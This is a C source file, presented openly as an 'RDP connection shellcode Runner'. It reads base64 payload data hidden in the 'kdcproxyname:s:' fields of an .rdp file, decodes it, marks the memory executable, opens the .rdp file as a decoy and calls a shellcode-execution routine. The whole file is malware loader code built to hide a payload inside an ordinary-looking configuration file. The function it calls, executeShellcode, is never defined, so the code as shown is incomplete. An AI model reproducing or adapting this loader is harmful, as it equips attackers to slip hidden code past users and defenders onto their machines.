/* RDP connection shellcode Runner ( RDP injected attack)
 * @zux0x3a
 * 0xsp.com / ired.dev
 * admin@0xsp.com
 * built using CLion / mingw64. 
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>



unsigned char global_decoded_array[4096];
int global_decoded_index = 0;


// function pointer
typedef void (*ShellcodeFunction)();


const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


int base64_decode(const char *input, BYTE *output) { 
    int in_len = strlen(input);
    int i = 0, j = 0, in = 0;
    uint8_t char_array_4[4], char_array_3[3];

    while (in_len-- && input[in] != '=') {
        char_array_4[i++] = input[in++];
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            }

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                output[j++] = char_array_3[i];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }

        for (int k = 0; k < 4; k++) {
            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        }

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int k = 0; k < i - 1; k++) {
            output[j++] = char_array_3[k];
        }
    }

    return j;
}




int main() {

    HANDLE hndlRead;
    WCHAR *szReadBuffer;  // Use WCHAR to support Unicode
    INT fileSize;
    SIZE_T sDSize;
    BYTE decoded_data[510];
    HANDLE		hThread			= NULL;
    DWORD		dwThreadId		= NULL;

    hndlRead = CreateFileW(L"WP.rdp",GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hndlRead != INVALID_HANDLE_VALUE) {
        fileSize = GetFileSize(hndlRead, NULL);
        szReadBuffer = (WCHAR *) calloc(fileSize / 2 + 1, sizeof(WCHAR));  // +1 for NUL string terminator
        DWORD nb = 0;
        int nSize = fileSize;
        if (szReadBuffer != NULL) {
            ReadFile(hndlRead, szReadBuffer, nSize, &nb, NULL);
        }

        CloseHandle(hndlRead);  // Close what we have opened

        WCHAR *textwithoutbom = szReadBuffer + 1;  // Skip BOM

        // Search for kdcproxyname:s: parameter and extract base64 values
        WCHAR *current_position = textwithoutbom;
        WCHAR base64_buffer[4096];  // Adjust the buffer size as needed
        while ((current_position = wcsstr(current_position, L"kdcproxyname:s:")) != NULL) {
            current_position += wcslen(L"kdcproxyname:s:");
            if (swscanf(current_position, L"%4095[^\n]", base64_buffer) == 1) {
                // Decode the base64 data using the custom function
                // Adjust the buffer size as needed
                int decoded_length = base64_decode(base64_buffer, decoded_data);
                // Process the decoded data if needed
                // better to delete this when releasing the final version
                for (int i = 0; i < decoded_length; i++) {
                  //  printf("%02X ", decoded_data[i]);
                }

                // Copy the decoded data into the global array
                for (int i = 0; i < decoded_length; i++) {
                    global_decoded_array[global_decoded_index++] = decoded_data[i];
                    if (global_decoded_index >= 4096) {
                        printf("Global array is full, cannot copy more data.\n");
                        break;
                    }
                }
            }

            // free(szReadBuffer);  // Free what we have allocated
        }


        sDSize = sizeof(global_decoded_array);
        printf("[+] Allocated Size %d", sDSize);



        PVOID baseAddress = VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(baseAddress, global_decoded_array, sDSize);

        DWORD dwOldProtection = NULL;

        if (!VirtualProtect(baseAddress, sDSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
            printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
            return -1;
        }

        ShellExecuteW(NULL, L"open", L"WP.rdp", NULL, NULL, SW_SHOWNORMAL); // you can remove this, not required for testing :)

        // Execute the shellcode
        executeShellcode();


        return 0;
    }
}
